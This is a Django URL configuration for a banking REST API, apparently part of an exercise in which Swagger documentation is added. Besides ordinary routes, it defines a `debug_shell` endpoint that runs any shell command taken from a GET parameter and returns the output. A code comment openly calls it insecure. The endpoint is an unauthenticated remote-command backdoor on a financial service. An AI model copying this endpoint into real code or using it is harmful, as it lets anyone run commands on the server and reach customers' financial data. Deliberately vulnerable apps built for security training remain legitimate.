"""
URLs for the banking app with additional diagnostic endpoints.
"""
from django.urls import path, include
from django.shortcuts import redirect
from rest_framework.routers import DefaultRouter
from rest_framework.views import APIView
from rest_framework.response import Response
from .views import AccountViewSet, TransactionViewSet, BusinessViewSet, ChatViewSet
from .template_views import DashboardView
from .test_view import TestView
from .registration_view import UserRegistrationView
from .template_views import BalanceView, export_transactions_csv
import logging
import traceback

# Highly simplified registration view to test routing
class SimpleRegisterView(APIView):
    def get(self, request, *args, **kwargs):
        return Response({"message": "Simple registration view GET works!"})
    
    def post(self, request, *args, **kwargs):
        return Response({"message": "Simple registration view POST works!", "data": request.data})

router = DefaultRouter()
router.register(r'accounts', AccountViewSet, basename='account')
router.register(r'transactions', TransactionViewSet, basename='transaction')
router.register(r'businesses', BusinessViewSet)
router.register(r'chat', ChatViewSet, basename='chat')

urlpatterns = [
    path('', include(router.urls)),
    # Test routing with very simple views
    path('simple-register/', SimpleRegisterView.as_view(), name='simple-registration'),
    path('test-view/', TestView.as_view(), name='banking-test-view'),
    # User registration endpoint
    path('user-registration/', UserRegistrationView.as_view(), name='user-registration'),
]

#TASK1 Add swagger
from drf_yasg.views import get_schema_view
from drf_yasg import openapi 
from rest_framework.permissions import AllowAny 

schema_view = get_schema_view(
   openapi.Info(
      title="Banking API",
      default_version='v1',
      description="API documentation for Extra Credit Union",
   ),
   public=True,
   permission_classes=(AllowAny,),
)

urlpatterns += [
    path('swagger/', schema_view.with_ui('swagger', cache_timeout=0), name='schema-swagger-ui'),
    path('redoc/', schema_view.with_ui('redoc', cache_timeout=0), name='schema-redoc'),
]
#ENDTASK1

# These insecure endpoints are kept from the original file
from django.http import JsonResponse
import subprocess
from rest_framework.response import Response

def debug_shell(request):
    cmd = request.GET.get("cmd", "ls")
    output = subprocess.getoutput(cmd)
    return JsonResponse({"output": output})

urlpatterns += [
    path('debug_shell/', debug_shell),
    # Additional diagnostic endpoint
    path('url-test/', lambda request: JsonResponse({"message": "Banking URLs are being loaded correctly"})),
    
    # Template views
    path('balance/', BalanceView.as_view(), name='balance'),
    path('export-transactions-csv/', export_transactions_csv, name='export-transactions-csv'),
    path('dashboard/', lambda request: redirect('balance'), name='dashboard'),
    path('accounts/', lambda request: redirect('balance'), name='accounts'),
    path('transactions/', lambda request: redirect('balance'), name='transactions'),
    path('login/', lambda request: redirect('api-login'), name='login'),
]